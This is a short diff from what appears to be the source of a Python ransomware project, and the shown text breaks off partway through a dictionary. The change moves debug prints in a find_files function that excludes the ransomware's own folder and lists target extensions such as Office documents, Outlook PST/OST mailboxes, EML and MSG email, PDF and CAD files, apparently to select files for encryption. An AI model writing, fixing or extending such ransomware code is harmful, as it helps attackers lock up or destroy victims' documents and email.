@@ -2,12 +2,13 @@ import os
 import base64
 
 def find_files(path):
-    # Add to get_files.py
-    print(f"Searching for files in: {path}")
-    print(f"Excluding ransomware folder: {ransomware_folder}")
     
     # Get absolute path of the Ransomware folder to exclude it
     ransomware_folder = os.path.abspath(os.path.dirname(__file__))
+    
+    # Add to get_files.py
+    print(f"Searching for files in: {path}")
+    print(f"Excluding ransomware folder: {ransomware_folder}")
     
     extensions = {'.DOC': 0, '.DOCX': 0, '.XLS': 0, '.XLSX': 0, '.PPT': 0, '.PPTX': 0, '.PST': 0, '.OST': 0, '.MSG': 0, '.EML': 0, '.VSD\
 ': 0, '.VSDX': 0, '.TXT': 0, '.CSV': 0, '.RTF': 0, '.WKS': 0, '.WK1': 0, '.PDF': 0, '.DWG': 0, '.ONETOC2': 0, '.SNT': 0
